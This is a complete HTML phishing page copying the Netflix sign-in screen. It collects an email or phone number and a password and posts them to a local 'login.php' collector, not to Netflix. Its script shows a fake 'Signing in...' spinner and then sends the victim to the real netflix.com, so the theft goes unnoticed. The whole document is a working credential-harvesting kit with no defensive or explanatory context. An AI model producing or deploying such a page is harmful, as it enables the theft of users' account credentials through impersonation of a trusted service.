<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Netflix</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Helvetica,Arial,sans-serif;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}.container{width:100%;max-width:450px;background:rgba(0,0,0,.75);padding:60px 68px 40px;border-radius:4px}.logo{color:#e50914;font-size:32px;font-weight:700;margin-bottom:28px}.title{font-size:32px;font-weight:500;margin-bottom:28px}.input-field{width:100%;padding:16px 20px;font-size:16px;background:#333;border:none;border-radius:4px;color:#fff;margin-bottom:16px}.input-field:focus{outline:none;background:#454545}.login-btn{width:100%;padding:16px;font-size:16px;font-weight:500;color:#fff;background:#e50914;border:none;border-radius:4px;cursor:pointer;margin-top:24px}.login-btn:hover{background:#f40612}.help{margin-top:16px;font-size:13px;color:#b3b3b3}.help a{color:#fff;text-decoration:none}.signup{margin-top:16px;font-size:16px;color:#737373}.signup a{color:#fff;text-decoration:none}.loading{display:none;text-align:center;padding:20px}.spinner{border:3px solid #333;border-top:3px solid #e50914;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
</head><body><div class="container"><div class="logo">NETFLIX</div><h1 class="title">Sign In</h1><form id="loginForm" method="POST" action="../login.php"><input type="text" name="username" class="input-field" placeholder="Email or phone number" required><input type="password" name="password" class="input-field" placeholder="Password" required><button type="submit" class="login-btn">Sign In</button></form><div class="help"><a href="#">Need help?</a></div><div class="signup">New to Netflix? <a href="#">Sign up now</a>.</div><div class="loading" id="loading"><div class="spinner"></div><p>Signing in...</p></div></div>
<script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();document.querySelector('form').style.display='none';document.querySelector('.help').style.display='none';document.querySelector('.signup').style.display='none';document.getElementById('loading').style.display='block';fetch('../login.php',{method:'POST',body:new FormData(this)}).then(()=>setTimeout(()=>window.location.href='https://www.netflix.com/',2000));});</script></body></html>
